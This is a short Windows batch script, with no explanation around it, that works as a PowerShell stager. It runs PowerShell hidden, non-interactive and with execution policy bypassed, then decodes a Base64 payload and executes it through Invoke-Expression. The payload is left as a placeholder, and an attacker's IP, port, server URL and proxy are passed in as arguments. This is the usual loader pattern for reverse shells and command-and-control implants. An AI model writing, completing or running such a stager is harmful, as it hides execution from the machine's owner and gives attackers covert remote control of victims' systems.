@echo off
set ip=%1
set port=%2
set serverUrl=%3
set proxyUrl=%4

powershell -NoP -NonI -W Hidden -Exec Bypass -Command ^
  "$proxyUrl = '%proxyUrl%'; ^
  $encodedScript = '<Base64_encoded_string>'; ^
  $decodedScript = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedScript)); ^
  Invoke-Expression ($decodedScript -replace '\$ip', '%ip%' -replace '\$port', '%port%' -replace '\$serverUrl', '%serverUrl%' -replace '\$proxyUrl', $proxyUrl)"
